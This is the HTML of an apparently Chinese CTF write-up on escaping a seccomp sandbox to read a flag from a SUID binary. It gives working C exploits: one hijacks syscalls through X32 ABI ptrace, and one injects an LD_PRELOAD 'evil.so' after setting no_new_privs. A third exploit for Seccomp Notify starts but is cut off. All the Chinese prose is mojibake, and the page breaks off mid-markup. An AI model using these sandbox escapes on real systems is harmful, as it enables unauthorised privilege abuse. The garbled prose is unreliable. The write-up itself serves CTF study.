ç›®å½•ç›´æ¥è¯»ï¼ˆæœ¬é¢˜æ‰§è¡Œäº† <code>umount(&quot;/proc&quot;)</code>ï¼ŒğŸ”ï¼‰</li><li>åˆ©ç”¨ <code>LD_PROLOAD</code> ç­‰ç¯å¢ƒå˜é‡ï¼Œhook æ‰å…³é”®å‡½æ•°ï¼ˆä½†æ˜¯ SUID ç¨‹åºä¸€èˆ¬ä¸èµ°è¿™äº›å˜é‡ï¼‰</li><li>åˆ©ç”¨ Ptrace ç³»ç»Ÿè°ƒç”¨ï¼Œå³ä½¿æ²¡æœ‰è¯»å†™æƒé™ï¼Œä¹Ÿèƒ½ hook æ‰å­è¿›ç¨‹æ‰§è¡Œæ—¶çš„ syscallï¼ˆä½†æ˜¯ Ptrace å¥½åƒè¢« ban äº†ï¼‰</li></ul><h3 id="Exp1-X32-ABI"><a class="header-anchor" href="#Exp1-X32-ABI">Â¶</a>Exp1(X32 ABI)</h3><p>å…ˆèŠèŠæ¯”èµ›çš„æ—¶å€™æˆ‘çš„æƒ³æ³•ï¼šç”±äºæˆ‘ç»™æ–°ç”Ÿèµ›å‡ºé¢˜å¡äº†ä¸ªç±»ä¼¼çš„ Seccomp çš„ç¼˜æ•…ğŸ˜ˆï¼Œç¬¬ä¸€çœ¼å°±çœ‹åˆ° Seccomp æ²¡æœ‰å¯¹ <code>X32 ABI</code> çš„æ£€æµ‹ï¼Œé‚£ä¹ˆ Ptrace ban äº†ç­‰äºæ²¡ ban XDï¼ŒåŠ«æŒæ‰å­è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨å°± ok ğŸ˜ã€‚ï¼ˆè¿™ä¸æ˜¯ç™½ç»™å—.jpgï¼‰</p><p>ä½†å¾ˆå‚»çš„æ˜¯ï¼Œåœ¨è¿™ä¹‹å‰ï¼Œæˆ‘ä»¥ä¸º <code>X32 ABI</code> çš„è°ƒç”¨å·å°±æ˜¯ <code>0x4000000 + SYS_number</code> è¿™ç§ï¼Œå¯¹ç€ <code>0x40000000 + SYS_ptrace</code> å‘ç”µäº†å¥½ä¹…ï¼Œæœ€åå·®ç‚¹ä»¥ä¸ºè¿™æ¡è·¯èµ°ä¸é€šã€‚</p><p>åæ¥é€šè¿‡é˜…è¯»èµ„æ–™ï¼Œå‘ç°å…¶å®çœŸæ­£çš„ç³»ç»Ÿè°ƒç”¨å·ä¿å­˜åœ¨ <code>/usr/include/x86_64-linux-gnu/asm/unistd_x32.h</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _ASM_X86_UNISTD_X32_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _ASM_X86_UNISTD_X32_H 1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_ioctl (__X32_SYSCALL_BIT + 514)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_readv (__X32_SYSCALL_BIT + 515)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_writev (__X32_SYSCALL_BIT + 516)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_recvfrom (__X32_SYSCALL_BIT + 517)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_sendmsg (__X32_SYSCALL_BIT + 518)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_recvmsg (__X32_SYSCALL_BIT + 519)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_execve (__X32_SYSCALL_BIT + 520)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_ptrace (__X32_SYSCALL_BIT + 521)</span><br>...<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å‚è€ƒ<a href="https://clubby789.me/zer0pts2022/#readflag">åŸåšæ–‡</a>ï¼Œå¾ˆå®¹æ˜“çš„å°±å¯ä»¥å†™å‡ºä»¥ä¸‹åˆ©ç”¨ Expï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/personality.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> base = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> *<span class="hljs-title">regs</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;   <br>    <span class="hljs-comment">// X32 ABI å¯¹æŒ‡é’ˆè¦æ±‚ 32 ä½</span><br>    regs = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x233000</span>,<span class="hljs-number">0x1000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">pid_t</span> traced_process;<br>    <span class="hljs-type">long</span> ins;<br>    <span class="hljs-type">char</span> *argvs[] = &#123;<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// ptrace(PTRACE_TRACEME, 0, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>, argvs, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exec failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    wait(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">int</span> blocked = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Wait until the child makes a syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <br>        <span class="hljs-comment">// ptrace(PTRACE_GETREGS, pid, 0, &amp;regs);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_GETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        <span class="hljs-comment">// è·å–ç¨‹åºåŸºå€ï¼Œç”¨ strace åœ¨æœ¬åœ°è§‚å¯Ÿå¾—åˆ°ç‰¹å¾</span><br>        <span class="hljs-keyword">if</span>(regs-&gt;orig_rax == <span class="hljs-number">10</span> &amp;&amp; regs-&gt;rsi==<span class="hljs-number">0x1000</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Mmap Rdi:%08llx\nMmap Rsi:%08llx\nMmap Rdx:%08llx\n&quot;</span>,regs-&gt;rdi,regs-&gt;rsi,regs-&gt;rdx);<br>            base = regs-&gt;rdi;<br>        &#125;<br>        <span class="hljs-comment">// éšä¾¿åŠ«æŒä¸€ä¸ª Write çš„ç³»ç»Ÿè°ƒç”¨ï¼Œrsi åŠ«æŒåˆ°åŸºå€ï¼Œrdx å¤§å°å¤§ä¸€ç‚¹</span><br>        <span class="hljs-keyword">if</span> (regs-&gt;orig_rax == <span class="hljs-number">1</span> &amp;&amp; regs-&gt;rdx == <span class="hljs-number">0x10</span>) &#123;<br>            blocked = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi before:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            regs-&gt;rdx = <span class="hljs-number">0x2000</span>;<br>            regs-&gt;rsi = base;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi after:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            <span class="hljs-comment">// ptrace(PTRACE_SETREGS, pid, 0, regs);</span><br>            syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        &#125;<br>        <span class="hljs-comment">// Continue on with the now blocked syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// If the program checks return value of the write, we need to make sure that the return value isn&#x27;t `-ENOSYS`</span><br>        <span class="hljs-comment">// if (blocked) &#123;regs-&gt;rax = 1; ptrace(PTRACE_SETREGS, pid, 0, regs); &#125;</span><br>        <span class="hljs-keyword">if</span> (blocked) &#123;regs-&gt;rax = <span class="hljs-number">1</span>; syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs); <span class="hljs-keyword">break</span>;&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016020408849.png" alt="image-20221016020408849"></p><h3 id="Exp2-LD-PRELOAD"><a class="header-anchor" href="#Exp2-LD-PRELOAD">Â¶</a>Exp2(LD_PRELOAD)</h3><p>ç»“æŸååœ¨ Discord çœ‹åˆ°ç©ºç™½å¸ˆå‚…å‘çš„ Expï¼Œé™·å…¥äº†æ²‰æ€ ğŸ¤”ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202210191813572.png" alt=""></p><p>æˆ‘ä»¬çŸ¥é“ï¼Œè®¾ç½®äº† SUID çš„ç¨‹åºï¼ˆæœ¬é¢˜çš„ <code>readme</code>ï¼‰ä¸€èˆ¬ä¸èµ° LD_PRELOAD ç­‰ç¯å¢ƒå˜é‡(<a href="https://linux.die.net/man/8/ld.so">æ–‡æ¡£</a>)ã€‚</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">LD_PRELOAD</span><br>è¦åœ¨æ‰€æœ‰å…¶ä»–å…±äº«åº“ä¹‹å‰åŠ è½½çš„é™„åŠ çš„ã€ç”¨æˆ·æŒ‡å®šçš„ <span class="hljs-string">ELF</span> å…±äº«åº“çš„åˆ—è¡¨ã€‚åˆ—è¡¨ä¸­çš„é¡¹ç›®å¯ä»¥ç”¨ç©ºæ ¼æˆ–å†’å·åˆ†éš”ã€‚è¿™å¯ç”¨äºé€‰æ‹©æ€§åœ°è¦†ç›–å…¶ä»–å…±äº«åº“ä¸­çš„å‡½æ•°ã€‚ä½¿ç”¨æè¿°ä¸‹ç»™å‡ºçš„è§„åˆ™æœç´¢åº“ã€‚å¯¹äº <span class="hljs-built_in">set-user-ID/set-group-ID</span> <span class="hljs-string">ELF</span> äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŒ…å«æ–œæ çš„é¢„åŠ è½½è·¯å¾„åå°†è¢«å¿½ç•¥ï¼Œå¹¶ä¸”åªæœ‰åœ¨åº“æ–‡ä»¶ä¸Šå¯ç”¨äº† <span class="hljs-built_in">set-user-ID</span> æƒé™ä½æ—¶æ‰ä¼šåŠ è½½æ ‡å‡†æœç´¢ç›®å½•ä¸­çš„åº“ã€‚<br><span class="hljs-string">LD_DEBUG</span><br>ï¼ˆ<span class="hljs-string">glibc</span> è‡ª <span class="hljs-string">2</span>.<span class="hljs-string">1</span> èµ·ï¼‰è¾“å‡ºæœ‰å…³åŠ¨æ€é“¾æ¥å™¨çš„è¯¦ç»†è°ƒè¯•ä¿¡æ¯ã€‚å¦‚æœè®¾ç½®ä¸º<span class="hljs-string">all</span>ï¼Œåˆ™æ‰“å°å®ƒæ‹¥æœ‰çš„æ‰€æœ‰è°ƒè¯•ä¿¡æ¯ï¼Œå¦‚æœè®¾ç½®ä¸º <span class="hljs-string">help</span> ï¼Œåˆ™æ‰“å°ä¸€æ¡å¸®åŠ©æ¶ˆæ¯ï¼Œè¯´æ˜å¯ä»¥åœ¨æ­¤ç¯å¢ƒå˜é‡ä¸­æŒ‡å®šå“ªäº›ç±»åˆ«ã€‚ä» <span class="hljs-string">glibc</span> <span class="hljs-string">2</span>.<span class="hljs-string">3</span>.<span class="hljs-string">4</span>å¼€å§‹ï¼Œå¯¹äº <span class="hljs-built_in">set-user-ID/set-group-ID</span> äºŒè¿›åˆ¶æ–‡ä»¶ ï¼Œ <span class="hljs-string">LD_DEBUG</span>è¢«å¿½ç•¥ã€‚<br></code></pre></td></tr></table></figure><p>äº‹åæˆ‘å»è¯·æ•™äº†ä¸‹ç©ºç™½å¸ˆå‚…ï¼Œå¤§æ„æ˜¯èµ°ä¸èµ° LD_PRELOAD è¿™ç§å˜é‡ï¼Œå…¶å®æ˜¯æ ¹æ® SUID <strong>æ˜¯å¦çœŸå®ç”Ÿæ•ˆ</strong>æ¥åˆ¤æ–­çš„ã€‚è¿™é‡Œé€šè¿‡ prctl <strong>ç¦æ­¢</strong>äº† SUID ç”Ÿæ•ˆï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ç¨‹åºå†…æ‰§è¡Œçš„æ–‡ä»¶å°±ä¸å†å½“åš SUID æ–‡ä»¶å¤„ç†ã€‚</p><ul><li>ä¸ºä»€ä¹ˆ prctl å¯ä»¥ç¦æ­¢ SUID ç”Ÿæ•ˆï¼Ÿ</li></ul><p><a href="https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt">æ–‡æ¡£</a>æ˜¯æˆ‘å ï¼Œå¯ä»¥çœ‹åˆ° SUID è¢«ç‚¹åè¡¨æ‰¬ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">The</span> execve system call can grant a newly-started program privileges that<br>its parent did not have.  <span class="hljs-title class_">The</span> most obvious examples are setuid/setgid<br>programs and file capabilities.  <span class="hljs-title class_">To</span> prevent the parent program <span class="hljs-keyword">from</span><br>gaining these privileges <span class="hljs-keyword">as</span> well, the kernel and user code must be<br>careful to prevent the parent <span class="hljs-keyword">from</span> doing anything that could subvert the<br>child.  <br>...<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç®€å•çš„å†™å‡º Expï¼š</p><p>å…ˆæ•´ä¸ªåº“ï¼Œç„¶åç®€å•è½¬æ¢ä¸‹æ ¼å¼æ”¾åˆ° exp é‡Œé¢ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span> &#123;<br>    write(<span class="hljs-number">1</span>,data<span class="hljs-number">-0x100</span>,<span class="hljs-number">0x100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC a.c -o evil.so<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/personality.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> base = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> *<span class="hljs-title">regs</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">char</span> evilso[] = &#123;å¤ªé•¿ä¸å†™&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    FILE *fp = fopen(<span class="hljs-string">&quot;/tmp/evil.so&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br>    fwrite(evilso,<span class="hljs-keyword">sizeof</span>(evilso),<span class="hljs-number">1</span>,fp);<br>    fclose(fp);<br>    prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;readme&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-type">char</span> *envp[] = &#123;<span class="hljs-string">&quot;LD_PRELOAD=/tmp/evil.so&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>,args,envp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016135122114.png" alt="image-20221016135122114"></p><h3 id="Exp3-Seccomp-Notify"><a class="header-anchor" href="#Exp3-Seccomp-Notify">Â¶</a>Exp3(Seccomp Notify)</h3><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016023043480.png" alt="image-20221016023043480"></p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016023104368.png" alt="image-20221016023104368"></p><p>åæ¥å‘ç°ä¸Šé¢ä¿©è§£éƒ½ä¸æ˜¯é¢„æœŸè§£ï¼Œå®åœ¨æ˜¯å¤ªğŸ˜ˆäº†ã€‚</p><p>é‚£ä¹ˆè§‚å¯Ÿå‡ºé¢˜äººDiscordå‘è¨€ï¼Œé¢„æœŸæ˜¯ä¸€ä¸ªå« <code>Seccomp Notify</code> çš„æœºåˆ¶ï¼Œæ˜‚ï¼Œä¹Ÿèƒ½æ‹¦æˆªç³»ç»Ÿè°ƒç”¨ç„¶åè¿›è¡ŒåŠ«æŒã€‚çœ‹äº†<a href="http://just4coding.com/2022/04/03/seccomp/">è¿™ç¯‡æ–‡ç« </a>åŸºæœ¬çš„æ¨¡æ¿å°±èƒ½æŒæ¡äº†ã€‚</p><p>ç”±äº <code>Ubuntu 1804</code> è²Œä¼¼ç¼ºäº†åº“å•¥çš„ <code>Notify</code> ç”¨ä¸äº†ï¼Œå¹²è„†ç›´æ¥å¼€ä¸ª Socat æ‹¿ 2204 æµ‹è¯•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat TCP-LISTEN:6000,fork,reuseaddr EXEC:<span class="hljs-string">&quot;python3 deploy.py&quot;</span>,pty,stderr<br></code></pre></td></tr></table></figure><p>Seccomp Notify è¯´å®è¯ï¼Œæ„Ÿè§‰ä¸å¦‚ <code>Ptrace</code> â€¦å¼ºã€‚è¿™ç©æ„è²Œä¼¼ç”¨é€”æ˜¯ç”¨æ¥æ¨¡æ‹Ÿç³»ç»Ÿè°ƒç”¨ï¼Œæ²¡æœ‰ <code>Ptrace</code> é‚£ç§çˆ¸çˆ¸æ‰“å„¿å­ï¼Œç³»ç»Ÿè°ƒç”¨å‚æ•°å¯„å­˜å™¨éƒ½ç»™ä½  ğŸ‘ æ¨‚çš„é‚£ç§ power :d</p><p>æœ¬æ¥å‡†å¤‡åœ¨å®˜æ–¹ä¹‹å‰å†™å‡ºæ¥çš„ XDï¼Œç»“æœå½“é¸½å­äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ”¾å®˜æ–¹ exp å¥½äº† XDï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span 